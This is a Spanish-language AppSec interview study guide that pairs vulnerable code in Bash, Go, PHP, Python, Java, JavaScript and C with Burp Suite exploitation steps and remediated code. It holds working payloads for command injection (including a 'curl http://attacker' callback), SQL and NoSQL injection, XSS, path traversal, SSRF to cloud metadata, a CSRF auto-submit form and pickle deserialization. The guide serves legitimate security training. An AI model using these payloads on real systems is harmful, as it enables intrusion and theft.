# Guia de Estudio AppSec para Entrevista Tecnica

## Objetivo

Prepararte en dos semanas para una entrevista exigente de seguridad de aplicaciones web con foco en:

- SAST: revision manual de codigo para encontrar vulnerabilidades reales.
- DAST: explotacion dinamica usando exclusivamente Burp Suite.
- Criterio de severidad, explotabilidad, remediacion y comunicacion tecnica.

## Como estudiar esta guia

1. Lee cada modulo con mentalidad de revisor: fuente, sink, validaciones y contexto.
2. Reproduce mentalmente la explotacion en Burp aunque no levantes el laboratorio.
3. Compara siempre codigo vulnerable vs codigo corregido.
4. Resuelve el ejercicio practico sin mirar la solucion durante 10 a 15 minutos.
5. Repite el mismo patron: identificar entrada controlable, transformaciones, sink y controles faltantes.

## Plan de 2 semanas

### Semana 1

- Dia 1: Metodologia SAST, Command Injection y Path Traversal.
- Dia 2: SQL Injection y NoSQL Injection.
- Dia 3: XSS, CSRF y validacion de contexto.
- Dia 4: SSRF y controles de red.
- Dia 5: Deserializacion insegura, Pickle, Java serialization y memoria basica en C.
- Dia 6: Logica de negocio, IDOR, JWT y race conditions.
- Dia 7: Simulacro de entrevista y resolucion de ejercicios SAST.

### Semana 2

- Dia 8: Repeticion de laboratorios Docker con Burp Suite.
- Dia 9: Practica de payloads y variaciones.
- Dia 10: Repaso de remediaciones seguras por lenguaje.
- Dia 11: Preguntas tecnicas cronometradas.
- Dia 12: Resolucion de codigo desconocido.
- Dia 13: Simulacro integral SAST + DAST.
- Dia 14: Resumen personal de patrones y errores frecuentes.

## Checklist mental de un reviewer AppSec

- ¿Cual es la entrada controlada por el usuario?
- ¿Se propaga directa o indirectamente a un sink peligroso?
- ¿Existe validacion positiva, canonicalizacion y control de contexto?
- ¿La proteccion depende de blacklist, regex debil o sanitizacion tardia?
- ¿Hay autenticacion, autorizacion y anti-automation adecuadas?
- ¿La remediacion elimina la causa raiz o solo maquilla el sintoma?

## Modulo 1: Inyeccion de Comandos

### Vulnerabilidad: Command Injection en Bash

#### 1. Concepto

Ocurre cuando datos controlados por el usuario llegan a un interprete de comandos del sistema operativo. El problema real no es ejecutar un comando, sino construir una cadena que el shell vuelva a interpretar. Caracteres como `;`, `&&`, `|`, backticks, `$(...)` y redirecciones permiten concatenar acciones arbitrarias.

#### 2. Revision de Codigo Vulnerable

```bash
01 #!/usr/bin/env bash
02 read -r -p "Host: " HOST
03 read -r -p "Count: " COUNT
04 CMD="ping -c ${COUNT} ${HOST}"
05 echo "[*] Ejecutando: ${CMD}"
06 bash -c "${CMD}"
```

Fallo exacto:

- Linea 04: se construye un comando shell usando datos no confiables.
- Linea 06: `bash -c` fuerza una segunda interpretacion del string completo y convierte `HOST` y `COUNT` en control total del shell.

Indicadores SAST:

- Presencia de `bash -c`, `sh -c`, `eval`, backticks o `source`.
- Concatenacion de variables de usuario dentro de un comando.
- Ausencia de allowlist para host y count.

#### 3. Explotacion (Burp Suite)

Supongamos un formulario web que envia:

```http
POST /diagnostics/ping HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1&count=1
```

Paso a paso:

1. Intercepta la peticion en Proxy.
2. Envia a Repeater.
3. Sustituye `host=127.0.0.1` por `host=127.0.0.1;id`.
4. Observa si la respuesta incluye salida del comando adicional o cambios temporales de tiempo.
5. Si la aplicacion filtra `;`, prueba con `&&`, `|`, `%0a`, backticks o `$(id)`.
6. Usa Decoder para probar variantes URL encoded como `%26%26id` o `%0Aid`.
7. Si sospechas filtrado parcial, usa Intruder con una lista de separadores y payloads cortos.

Payloads utiles:

- `127.0.0.1;id`
- `127.0.0.1&&whoami`
- `127.0.0.1|uname -a`
- `127.0.0.1%0acat /etc/passwd`
- `$(sleep 5)`

#### 4. Remediacion

```bash
01 #!/usr/bin/env bash
02 read -r -p "Host: " HOST
03 read -r -p "Count: " COUNT
04 [[ "$HOST" =~ ^[a-zA-Z0-9\.\-]+$ ]] || { echo "host invalido"; exit 1; }
05 [[ "$COUNT" =~ ^[1-9][0-9]?$ ]] || { echo "count invalido"; exit 1; }
06 ping -c "$COUNT" -- "$HOST"
```

Buenas practicas:

- No usar `bash -c` ni `eval`.
- Validacion positiva estricta.
- Pasar argumentos como parametros, no como cadena reinterpretada.
- Limitar funcionalidades y privilegios del proceso.

#### 5. Ejercicio Practico

Si ves `cmd="nslookup $domain"` seguido de `output=$(sh -c "$cmd")`, explica dos payloads para explotarlo y propone una remediacion que siga permitiendo diagnostico DNS.

### Vulnerabilidad: Command Injection en Go

#### 1. Concepto

En Go, el riesgo aparece cuando se invoca un shell (`sh -c`) o cuando se permite que entradas no confiables controlen binario, argumentos o rutas. `exec.Command` es mas seguro cuando recibe comando y argumentos por separado, pero deja de serlo si se delega al shell.

#### 2. Revision de Codigo Vulnerable

```go
01 func pingHost(w http.ResponseWriter, r *http.Request) {
02     host := r.URL.Query().Get("host")
03     cmd := exec.Command("sh", "-c", "ping -c 1 "+host)
04     out, err := cmd.CombinedOutput()
05     if err != nil {
06         http.Error(w, string(out), 500)
07         return
08     }
09     w.Write(out)
10 }
```

Fallo exacto:

- Linea 03: el valor `host` entra a un shell mediante concatenacion.
- Linea 06: filtra salida interna al usuario y mejora la explotacion.

#### 3. Explotacion (Burp Suite)

Peticion objetivo:

```http
GET /ping?host=127.0.0.1 HTTP/1.1
Host: target.local
```

Pasos:

1. Intercepta y manda a Repeater.
2. Cambia `host` a `127.0.0.1;whoami`.
3. Si no ves salida, prueba `host=127.0.0.1;sleep 5` para detectar command injection ciega.
4. Usa Comparer para contrastar respuestas normales vs respuestas con payload.
5. Usa Intruder para automatizar variantes: `;id`, `&&id`, `|id`, `%0asleep 5`, `$(id)`.

#### 4. Remediacion

```go
01 var validHost = regexp.MustCompile(`^[a-zA-Z0-9.-]+$`)
02 
03 func pingHost(w http.ResponseWriter, r *http.Request) {
04     host := r.URL.Query().Get("host")
05     if !validHost.MatchString(host) {
06         http.Error(w, "host invalido", http.StatusBadRequest)
07         return
08     }
09     cmd := exec.Command("ping", "-c", "1", host)
10     out, err := cmd.CombinedOutput()
11     if err != nil {
12         http.Error(w, "error de diagnostico", 500)
13         return
14     }
15     w.Write(out)
16 }
```

#### 5. Ejercicio Practico

¿Por que `exec.Command("ping", "-c", "1", host)` reduce drasticamente el riesgo frente a `exec.Command("sh", "-c", "ping -c 1 "+host)`? Explica tambien un caso donde aun podria haber impacto si `host` no se valida.

### Vulnerabilidad: Command Injection en PHP

#### 1. Concepto

PHP suele exponer sinks peligrosos como `system`, `exec`, `shell_exec`, `passthru` y backticks. El riesgo se agrava cuando la aplicacion concatena parametros de `$_GET`, `$_POST` o cabeceras.

#### 2. Revision de Codigo Vulnerable

```php
01 <?php
02 $ip = $_GET['ip'] ?? '127.0.0.1';
03 $output = shell_exec("ping -c 1 " . $ip);
04 echo "<pre>" . $output . "</pre>";
```

Fallo exacto:

- Linea 03: `shell_exec` recibe un string controlado por el usuario.
- Linea 04: la salida del sistema se devuelve directamente, facilitando validacion del exploit.

#### 3. Explotacion (Burp Suite)

```http
GET /ping.php?ip=127.0.0.1 HTTP/1.1
Host: target.local
```

Pasos:

1. Intercepta y envia a Repeater.
2. Inyecta `ip=127.0.0.1;cat /etc/passwd`.
3. Si el resultado se muestra en HTML, usa Search dentro de Repeater para buscar `root:`.
4. Si hay filtros, usa Decoder para probar doble encoding o reemplazos con `${IFS}`.
5. Si la salida no es visible, cambia a payloads de tiempo como `;sleep 5`.

Payloads:

- `8.8.8.8;id`
- `8.8.8.8|uname -a`
- `8.8.8.8%0awhoami`
- `8.8.8.8;curl http://attacker/ping`

#### 4. Remediacion

```php
01 <?php
02 $ip = $_GET['ip'] ?? '127.0.0.1';
03 if (!filter_var($ip, FILTER_VALIDATE_IP)) {
04     http_response_code(400);
05     exit('IP invalida');
06 }
07 $cmd = ['ping', '-c', '1', $ip];
08 $descriptorSpec = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
09 $process = proc_open($cmd, $descriptorSpec, $pipes);
10 if (!is_resource($process)) {
11     http_response_code(500);
12     exit('Error interno');
13 }
14 $output = stream_get_contents($pipes[1]);
15 fclose($pipes[1]);
16 proc_close($process);
17 echo '<pre>' . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . '</pre>';
```

#### 5. Ejercicio Practico

Identifica el problema en `system("tar -czf /tmp/backup.tgz " . $_POST['path']);` y propone una correccion que permita respaldar solo directorios bajo `/srv/data`.

## Modulo 2: Inyecciones SQL y NoSQL

### Vulnerabilidad: SQL Injection en Python

#### 1. Concepto

SQL Injection ocurre cuando la consulta se construye mezclando sintaxis SQL con datos controlados por el usuario. El atacante altera la semantica de la consulta: autenticarse sin credenciales, enumerar tablas, leer o modificar datos.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.post("/login")
02 def login():
03     username = request.form["username"]
04     password = request.form["password"]
05     query = f"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'"
06     row = db.execute(query).fetchone()
07     if row:
08         session["user_id"] = row["id"]
09         return "ok"
10     return "invalid", 401
```

Fallo exacto:

- Linea 05: interpolacion directa de `username` y `password` dentro de SQL.
- Linea 06: ejecucion de la cadena manipulable.

#### 3. Explotacion (Burp Suite)

Peticion:

```http
POST /login HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=alice&password=secret
```

Pasos:

1. Intercepta y manda a Repeater.
2. Prueba `username=alice'-- -&password=x`.
3. Si el login requiere ambos campos, usa `username=' OR 1=1-- -&password=x`.
4. Observa diferencias de estado, longitud, cookies o mensajes.
5. Usa Intruder sobre `username` con payloads booleanos, de error y time-based.
6. En Decoder prepara variantes URL encoded si el servidor rompe caracteres especiales.

Payloads:

- `' OR 1=1-- -`
- `admin'/*`
- `' UNION SELECT 1,'admin'-- -`
- `' AND (SELECT CASE WHEN (1=1) THEN randomblob(1000000) END)-- -`

#### 4. Remediacion

```python
01 @app.post("/login")
02 def login():
03     username = request.form["username"]
04     password = request.form["password"]
05     row = db.execute(
06         "SELECT id, role FROM users WHERE username = ? AND password = ?",
07         (username, password),
08     ).fetchone()
09     if row:
10         session["user_id"] = row["id"]
11         return "ok"
12     return "invalid", 401
```

Notas:

- Consultas parametrizadas siempre.
- Mejor aun, passwords con hash y comparacion segura.
- No devolver errores SQL al cliente.

#### 5. Ejercicio Practico

Si la consulta vulnerable fuera `SELECT * FROM products WHERE id = ` + `request.args["id"]`, describe como probarias boolean-based, union-based y time-based desde Burp.

### Vulnerabilidad: SQL Injection en PHP

#### 1. Concepto

En PHP el error clasico es concatenar en SQL usando `mysqli_query`, `PDO->query` o construir clausulas `ORDER BY`, `LIMIT` y `WHERE` sin parametrizacion.

#### 2. Revision de Codigo Vulnerable

```php
01 <?php
02 $email = $_POST['email'];
03 $sql = "SELECT id, email FROM users WHERE email = '$email'";
04 $result = $mysqli->query($sql);
05 echo json_encode($result->fetch_assoc());
```

Fallo exacto:

- Linea 03: concatenacion directa del email.
- Linea 04: ejecucion de la consulta alterable.

#### 3. Explotacion (Burp Suite)

1. Intercepta el `POST`.
2. En Repeater prueba `email=' UNION SELECT 1,@@version-- -`.
3. Si falla por columnas, ajusta el numero con `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3`.
4. Si la respuesta es JSON, revisa si `@@version` aparece en el segundo campo.
5. Usa Intruder para automatizar conteo de columnas o condiciones booleanas.

#### 4. Remediacion

```php
01 <?php
02 $email = $_POST['email'];
03 $stmt = $mysqli->prepare("SELECT id, email FROM users WHERE email = ?");
04 $stmt->bind_param("s", $email);
05 $stmt->execute();
06 $result = $stmt->get_result();
07 echo json_encode($result->fetch_assoc());
```

#### 5. Ejercicio Practico

¿Como diferenciarias una SQLi explotable de un simple error de validacion cuando el backend devuelve siempre `{"status":"error"}` con HTTP 200?

### Vulnerabilidad: SQL Injection en Java

#### 1. Concepto

En Java suele verse en `Statement`, concatenacion de JPQL/HQL o construccion insegura de filtros dinamicos. El problema no cambia: el dato del usuario altera la consulta.

#### 2. Revision de Codigo Vulnerable

```java
01 public User findUser(String email) throws SQLException {
02     String sql = "SELECT id, email, role FROM users WHERE email = '" + email + "'";
03     Statement st = connection.createStatement();
04     ResultSet rs = st.executeQuery(sql);
05     if (rs.next()) {
06         return new User(rs.getLong("id"), rs.getString("email"), rs.getString("role"));
07     }
08     return null;
09 }
```

Fallo exacto:

- Linea 02: concatenacion de `email`.
- Linea 03: uso de `Statement` en vez de `PreparedStatement`.

#### 3. Explotacion (Burp Suite)

1. Captura el request que llama a este flujo.
2. En Repeater usa `' OR '1'='1`.
3. Si la aplicacion cambia de respuesta pero no muestra datos, observa diferencias en cookies, redirect o contenido.
4. Si sospechas blind SQLi, prueba demoras como `'; WAITFOR DELAY '0:0:5'--`.
5. Con Intruder automatiza payloads por motor si no conoces el backend.

#### 4. Remediacion

```java
01 public User findUser(String email) throws SQLException {
02     String sql = "SELECT id, email, role FROM users WHERE email = ?";
03     try (PreparedStatement ps = connection.prepareStatement(sql)) {
04         ps.setString(1, email);
05         try (ResultSet rs = ps.executeQuery()) {
06             if (rs.next()) {
07                 return new User(rs.getLong("id"), rs.getString("email"), rs.getString("role"));
08             }
09         }
10     }
11     return null;
12 }
```

#### 5. Ejercicio Practico

Explica por que concatenar un parametro de ordenamiento en `ORDER BY ` puede seguir siendo peligroso aunque el `WHERE` use `PreparedStatement`.

### Vulnerabilidad: NoSQL Injection en Python

#### 1. Concepto

NoSQL Injection aparece cuando datos de entrada se convierten en operadores o estructuras de consulta. En MongoDB es comun que el atacante inyecte objetos como `{"$ne": null}` o `{"$regex": ".*"}` en vez de un string esperado.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.post("/api/login")
02 def api_login():
03     data = request.get_json()
04     user = mongo.db.users.find_one({
05         "username": data["username"],
06         "password": data["password"],
07     })
08     if user:
09         return {"status": "ok"}
10     return {"status": "invalid"}, 401
```

Fallo exacto:

- Lineas 05 y 06: el backend asume strings, pero acepta objetos JSON arbitrarios.
- Si el atacante envia operadores Mongo, altera la consulta sin romper sintaxis.

#### 3. Explotacion (Burp Suite)

JSON original:

```http
POST /api/login HTTP/1.1
Host: target.local
Content-Type: application/json

{"username":"alice","password":"secret"}
```

Pasos:

1. Intercepta la peticion JSON.
2. En Repeater cambia a `{"username":{"$ne":null},"password":{"$ne":null}}`.
3. Si devuelve `ok`, confirma bypass de autenticacion.
4. Prueba combinaciones como `{"username":"admin","password":{"$regex":".*"}}`.
5. Usa Intruder sobre el cuerpo JSON para alternar operadores comunes: `$ne`, `$gt`, `$regex`, `$exists`.

#### 4. Remediacion

```python
01 @app.post("/api/login")
02 def api_login():
03     data = request.get_json()
04     username = data.get("username")
05     password = data.get("password")
06     if not isinstance(username, str) or not isinstance(password, str):
07         return {"status": "bad request"}, 400
08     user = mongo.db.users.find_one({
09         "username": username,
10         "password": password,
11     })
12     if user:
13         return {"status": "ok"}
14     return {"status": "invalid"}, 401
```

#### 5. Ejercicio Practico

Si el backend hace `collection.find_one(request.json)`, enumera tres impactos posibles ademas del bypass de login.

## Modulo 3: Local File Inclusion / Path Traversal

### Vulnerabilidad: Path Traversal en Java

#### 1. Concepto

Path Traversal ocurre cuando el usuario controla una ruta o fragmento de ruta y puede escapar del directorio previsto con `../`, rutas absolutas o codificaciones equivalentes. En Java el error tipico es resolver archivos sin canonicalizar ni verificar base path.

#### 2. Revision de Codigo Vulnerable

```java
01 public byte[] download(String filename) throws IOException {
02     Path base = Paths.get("/opt/app/reports");
03     Path target = base.resolve(filename);
04     return Files.readAllBytes(target);
05 }
```

Fallo exacto:

- Linea 03: `resolve` no impide salir del directorio base.
- Linea 04: lectura directa sin validar ruta canonicalizada.

#### 3. Explotacion (Burp Suite)

```http
GET /download?filename=invoice.pdf HTTP/1.1
Host: target.local
```

Pasos:

1. Manda a Repeater.
2. Sustituye por `filename=../../../../etc/passwd`.
3. Prueba variantes codificadas: `..%2f..%2f..%2fetc%2fpasswd`, `..%252f`.
4. Si hay filtro basico de `../`, usa rutas mixtas o normalizacion incompleta.
5. Si responde binario, revisa cabeceras `Content-Length` y contenido inicial.

#### 4. Remediacion

```java
01 public byte[] download(String filename) throws IOException {
02     Path base = Paths.get("/opt/app/reports").toRealPath();
03     Path target = base.resolve(filename).normalize();
04     if (!target.startsWith(base) || !Files.isRegularFile(target)) {
05         throw new SecurityException("ruta invalida");
06     }
07     return Files.readAllBytes(target);
08 }
```

#### 5. Ejercicio Practico

¿Por que `filename.replace("../", "")` no es suficiente? Da al menos dos bypasses conceptuales.

### Vulnerabilidad: Path Traversal en Go

#### 1. Concepto

En Go es comun confiar en `path.Clean` o concatenar con una base sin validar que el resultado final permanezca dentro del directorio permitido.

#### 2. Revision de Codigo Vulnerable

```go
01 func viewFile(w http.ResponseWriter, r *http.Request) {
02     name := r.URL.Query().Get("name")
03     fullPath := "/srv/files/" + name
04     data, err := os.ReadFile(fullPath)
05     if err != nil {
06         http.Error(w, err.Error(), 500)
07         return
08     }
09     w.Write(data)
10 }
```

Fallo exacto:

- Linea 03: concatenacion directa de ruta base con entrada del usuario.
- Linea 06: mensajes de error ayudan a afinar el traversal.

#### 3. Explotacion (Burp Suite)

1. Intercepta `GET /file?name=report.txt`.
2. En Repeater prueba `../../../../etc/passwd`.
3. Usa Decoder para URL encode simple y doble.
4. Si el servidor reemplaza `/`, prueba `%2e%2e%2f` o secuencias mezcladas.
5. Con Intruder automatiza payload positions sobre el parametro `name`.

#### 4. Remediacion

```go
01 func viewFile(w http.ResponseWriter, r *http.Request) {
02     base := "/srv/files"
03     name := r.URL.Query().Get("name")
04     cleaned := filepath.Clean("/" + name)
05     target := filepath.Join(base, cleaned)
06     rel, err := filepath.Rel(base, target)
07     if err != nil || strings.HasPrefix(rel, "..") {
08         http.Error(w, "ruta invalida", http.StatusBadRequest)
09         return
10     }
11     data, err := os.ReadFile(target)
12     if err != nil {
13         http.Error(w, "no encontrado", 404)
14         return
15     }
16     w.Write(data)
17 }
```

#### 5. Ejercicio Practico

Si la aplicacion sirve plantillas HTML y permite `?template=...`, ¿que impacto extra puede aparecer ademas de leer archivos?

## Modulo 4: Cross-Site Scripting (XSS) y CSRF

### Vulnerabilidad: XSS en JavaScript / Node.js

#### 1. Concepto

XSS aparece cuando datos no confiables se insertan en HTML, atributos, JavaScript o URL sin el escape correcto para ese contexto. Reflected XSS suele verse en respuestas inmediatas; stored XSS en datos persistidos.

#### 2. Revision de Codigo Vulnerable

```javascript
01 app.get('/search', (req, res) => {
02   const q = req.query.q || '';
03   res.send(`<h1>Resultados para: ${q}</h1>`);
04 });
```

Fallo exacto:

- Linea 03: el parametro `q` se inserta en contexto HTML sin escaping.

#### 3. Explotacion (Burp Suite)

1. Intercepta `GET /search?q=test`.
2. En Repeater cambia `q` por `<script>alert(1)</script>`.
3. Si ves filtros, prueba context-aware payloads.
4. `"><svg/onload=alert(1)>`
5. `<img src=x onerror=alert(document.domain)>`
6. Usa Decoder para URL encode si el navegador o proxy modifica caracteres.
7. En caso de stored XSS, envialo primero a la funcionalidad de almacenamiento y luego navega a la vista afectada usando Burp Browser.

#### 4. Remediacion

```javascript
01 const escapeHtml = (value) =>
02   value
03     .replace(/&/g, '&amp;')
04     .replace(/</g, '&lt;')
05     .replace(/>/g, '&gt;')
06     .replace(/"/g, '&quot;')
07     .replace(/'/g, '&#39;');
08 
09 app.get('/search', (req, res) => {
10   const q = String(req.query.q || '');
11   res.send(`<h1>Resultados para: ${escapeHtml(q)}</h1>`);
12 });
```

#### 5. Ejercicio Practico

Explica por que `stripTags()` no resuelve todos los casos de XSS si el valor luego termina en un atributo HTML o dentro de un bloque JavaScript.

### Vulnerabilidad: CSRF en Python

#### 1. Concepto

CSRF explota la confianza del navegador en cookies o credenciales automaticas. Si una accion sensible no exige un token anti-CSRF robusto ni valida origen, un sitio externo puede provocar acciones en nombre de la victima autenticada.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.post("/change-email")
02 def change_email():
03     if "user_id" not in session:
04         return "auth required", 401
05     new_email = request.form["email"]
06     db.execute("UPDATE users SET email = ? WHERE id = ?", (new_email, session["user_id"]))
07     db.commit()
08     return "updated"
```

Fallo exacto:

- No hay token anti-CSRF.
- No se valida `Origin` ni `Referer`.
- La sesion en cookie basta para ejecutar la accion.

#### 3. Explotacion (Burp Suite)

1. Intercepta una peticion legitima de cambio de email.
2. En el historial HTTP usa "Generate CSRF PoC" si esta disponible.
3. Verifica si la peticion se puede reproducir sin token.
4. Comprueba si el servidor acepta `Content-Type: application/x-www-form-urlencoded`.
5. Si el endpoint usa JSON pero no valida CORS u origen, analiza si sigue siendo explotable.
6. En Repeater elimina cabeceras opcionales y confirma el minimo necesario para que la accion funcione.

PoC basico:

```html
<form action="https://target.local/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="submit" value="submit">
</form>
<script>document.forms[0].submit()</script>
```

#### 4. Remediacion

```python
01 @app.post("/change-email")
02 def change_email():
03     if "user_id" not in session:
04         return "auth required", 401
05     token = request.form.get("csrf_token", "")
06     if token != session.get("csrf_token"):
07         return "csrf invalid", 403
08     origin = request.headers.get("Origin", "")
09     if origin != "https://target.local":
10         return "bad origin", 403
11     new_email = request.form["email"]
12     db.execute("UPDATE users SET email = ? WHERE id = ?", (new_email, session["user_id"]))
13     db.commit()
14     return "updated"
```

#### 5. Ejercicio Practico

Si una aplicacion usa `SameSite=Lax` en la cookie de sesion, ¿queda completamente mitigado el CSRF? Explica matices y escenarios.

## Modulo 5: Server-Side Request Forgery (SSRF)

### Vulnerabilidad: SSRF en Go

#### 1. Concepto

SSRF permite que el servidor haga peticiones hacia destinos elegidos por el atacante. Impactos comunes: acceso a metadatos cloud, servicios internos, paneles locales, escaneo interno y bypass de controles perimetrales.

#### 2. Revision de Codigo Vulnerable

```go
01 func fetchURL(w http.ResponseWriter, r *http.Request) {
02     target := r.URL.Query().Get("url")
03     resp, err := http.Get(target)
04     if err != nil {
05         http.Error(w, err.Error(), 500)
06         return
07     }
08     defer resp.Body.Close()
09     io.Copy(w, resp.Body)
10 }
```

Fallo exacto:

- Linea 03: el servidor realiza requests arbitrarios a URLs controladas por el usuario.
- Linea 05: errores internos filtran detalles de red.

#### 3. Explotacion (Burp Suite)

1. Intercepta `GET /fetch?url=https://example.com`.
2. En Repeater prueba destinos internos.
3. `http://127.0.0.1:8080/admin`
4. `http://169.254.169.254/latest/meta-data/`
5. `http://localhost:2375/version`
6. Usa Collaborator si sospechas SSRF ciega y quieres detectar callbacks.
7. Prueba redirects abiertos si el filtro valida solo el primer host.
8. Usa Decoder para ofuscaciones IP: decimal, octal, hexadecimal, IPv6-mapped.

#### 4. Remediacion

```go
01 func fetchURL(w http.ResponseWriter, r *http.Request) {
02     raw := r.URL.Query().Get("url")
03     u, err := url.Parse(raw)
04     if err != nil || (u.Scheme != "https" && u.Scheme != "http") {
05         http.Error(w, "url invalida", 400)
06         return
07     }
08     allowed := map[string]bool{"api.partner.example": true}
09     if !allowed[u.Hostname()] {
10         http.Error(w, "host no permitido", 403)
11         return
12     }
13     ipAddrs, _ := net.LookupIP(u.Hostname())
14     for _, ip := range ipAddrs {
15         if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
16             http.Error(w, "destino interno bloqueado", 403)
17             return
18         }
19     }
20     client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
21         return http.ErrUseLastResponse
22     }}
23     resp, err := client.Get(u.String())
24     if err != nil {
25         http.Error(w, "error remoto", 502)
26         return
27     }
28     defer resp.Body.Close()
29     io.Copy(w, resp.Body)
30 }
```

#### 5. Ejercicio Practico

Explica por que permitir cualquier URL HTTPS no mitiga SSRF y como abusarias de redirects o resolucion DNS si la validacion es incompleta.

### Vulnerabilidad: SSRF en Java

#### 1. Concepto

En Java aparece en funciones que consumen URLs remotas para previews, webhooks, importadores o fetchers. El error es confiar en la URL del cliente sin control de host, esquema, DNS e IP final.

#### 2. Revision de Codigo Vulnerable

```java
01 public String preview(String target) throws IOException {
02     URL url = new URL(target);
03     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
04     conn.setConnectTimeout(3000);
05     return new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
06 }
```

Fallo exacto:

- Linea 02: la URL es totalmente controlada por el usuario.
- Linea 03: el servidor inicia la conexion sin restricciones.

#### 3. Explotacion (Burp Suite)

1. Captura la peticion de preview.
2. Usa Repeater y apunta a `http://127.0.0.1:8080/actuator`.
3. Si la app corre en cloud, prueba metadatos.
4. Si hay validacion superficial de dominio, prueba userinfo, redirects, hosts alternos o DNS rebinding conceptual.
5. En SSRF ciega, usa Burp Collaborator para detectar resolucion o conexion saliente.

#### 4. Remediacion

```java
01 public String preview(String target) throws Exception {
02     URI uri = new URI(target);
03     if (!List.of("https").contains(uri.getScheme())) {
04         throw new SecurityException("scheme invalido");
05     }
06     String host = uri.getHost();
07     if (!"static.partner.example".equals(host)) {
08         throw new SecurityException("host invalido");
09     }
10     InetAddress[] addresses = InetAddress.getAllByName(host);
11     for (InetAddress address : addresses) {
12         if (address.isLoopbackAddress() || address.isSiteLocalAddress() || address.isLinkLocalAddress()) {
13             throw new SecurityException("ip no permitida");
14         }
15     }
16     HttpClient client = HttpClient.newBuilder()
17         .followRedirects(HttpClient.Redirect.NEVER)
18         .build();
19     HttpRequest request = HttpRequest.newBuilder(uri).GET().build();
20     return client.send(request, HttpResponse.BodyHandlers.ofString()).body();
21 }
```

#### 5. Ejercicio Practico

¿Que revisarias en un feature de importacion de imagenes por URL para descartar SSRF aunque el equipo diga que solo acepta `https://`?

## Modulo 6: Deserializacion Insegura y fallos de memoria basicos

### Vulnerabilidad: Deserializacion insegura con Pickle en Python

#### 1. Concepto

`pickle` no es un formato de datos seguro, sino un mecanismo para reconstruir objetos Python que puede ejecutar codigo arbitrario durante el proceso. Deserializar datos no confiables equivale practicamente a ejecutar codigo.

#### 2. Revision de Codigo Vulnerable

```python
01 @app.post("/import")
02 def do_import():
03     blob = request.files["backup"].read()
04     obj = pickle.loads(blob)
05     return {"status": "ok", "items": len(obj)}
```

Fallo exacto:

- Linea 04: `pickle.loads` sobre datos controlados por el usuario.

#### 3. Explotacion (Burp Suite)

1. Intercepta una subida legitima.
2. Genera un payload pickle malicioso con un objeto que invoque `os.system`.
3. Reemplaza el archivo en Burp Repeater o usa la funcionalidad de editar multipart.
4. Si no hay salida visible, usa payload de tiempo o callback externo.
5. Usa Comparer para revisar cambios en respuesta o tiempos.

Payload conceptual:

- Objeto con `__reduce__` que llama `os.system("sleep 5")`
- Objeto con `__reduce__` que hace `curl http://collaborator/...`

#### 4. Remediacion

```python
01 @app.post("/import")
02 def do_import():
03     blob = request.files["backup"].read()
04     obj = json.loads(blob.decode("utf-8"))
05     if not isinstance(obj, list):
06         return {"status": "bad format"}, 400
07     return {"status": "ok", "items": len(obj)}
```

#### 5. Ejercicio Practico

Si una aplicacion firma el archivo pickle antes de cargarlo, ¿queda eliminada la vulnerabilidad? Explica en que condiciones podria ser aceptable o no.

### Vulnerabilidad: Deserializacion insegura en Java

#### 1. Concepto

`ObjectInputStream.readObject()` sobre datos controlados por el usuario puede disparar cadenas gadget y ejecucion arbitraria. Incluso sin RCE, puede provocar DoS o logica inesperada.

#### 2. Revision de Codigo Vulnerable

```java
01 public Object importData(byte[] data) throws Exception {
02     ByteArrayInputStream bis = new ByteArrayInputStream(data);
03     ObjectInputStream in = new ObjectInputStream(bis);
04     return in.readObject();
05 }
```

Fallo exacto:

- Linea 04: deserializacion nativa de Java sin restricciones.

#### 3. Explotacion (Burp Suite)

1. Intercepta la subida o body binario.
2. Sustituye el payload por un stream serializado malicioso preparado externamente.
3. Si el endpoint es base64, usa Decoder para encode/decode rapido.
4. Observa errores como `InvalidClassException` o tiempos de respuesta para confirmar que el flujo llega a `readObject`.
5. Si el entorno tiene librerias gadget conocidas, el impacto puede llegar a RCE.

#### 4. Remediacion

```java
01 public UserPreferences importData(byte[] data) throws Exception {
02     String json = new String(data, StandardCharsets.UTF_8);
03     ObjectMapper mapper = new ObjectMapper();
04     return mapper.readValue(json, UserPreferences.class);
05 }
```

Si no puedes migrar de inmediato:

- Implementa `ObjectInputFilter`.
- Allowlist estricta de clases.
- Firma fuerte y verificacion de origen.

#### 5. Ejercicio Practico

¿Que evidencia estatica buscarias en un proyecto Java para determinar si una deserializacion es realmente explotable y no solo teorica?

### Vulnerabilidad: Fallos de memoria basicos en C

#### 1. Concepto

En entrevista AppSec suelen pedir reconocer patrones como buffer overflow, uso de funciones inseguras, integer overflow y use-after-free. Aunque la explotacion moderna puede requerir bypasses adicionales, el hallazgo SAST sigue siendo relevante.

#### 2. Revision de Codigo Vulnerable

```c
01 #include <stdio.h>
02 #include <string.h>
03 
04 void greet(char *name) {
05     char buffer[32];
06     strcpy(buffer, name);
07     printf("Hola %s\n", buffer);
08 }
```

Fallo exacto:

- Linea 06: `strcpy` copia sin verificar longitud y puede sobrescribir la pila.

#### 3. Explotacion (Burp Suite)

En web, este patron aparece cuando el backend nativo procesa parametros HTTP y los copia sin limite.

1. Intercepta una peticion que termina en el backend C.
2. En Repeater aumenta progresivamente el tamano del parametro.
3. Busca crashes, resets, cambios de tiempo o respuestas 500.
4. Usa Intruder para fuzz de longitudes: 32, 64, 128, 256, 512.
5. Si la app refleja errores del proceso, puede aparecer evidencia clara de corrupcion.

#### 4. Remediacion

```c
01 #include <stdio.h>
02 #include <string.h>
03 
04 void greet(const char *name) {
05     char buffer[32];
06     snprintf(buffer, sizeof(buffer), "%s", name);
07     printf("Hola %s\n", buffer);
08 }
```

Adicionalmente:

- Compilar con stack canaries, PIE y RELRO.
- Revisar tamanos, indices y ownership de memoria.

#### 5. Ejercicio Practico

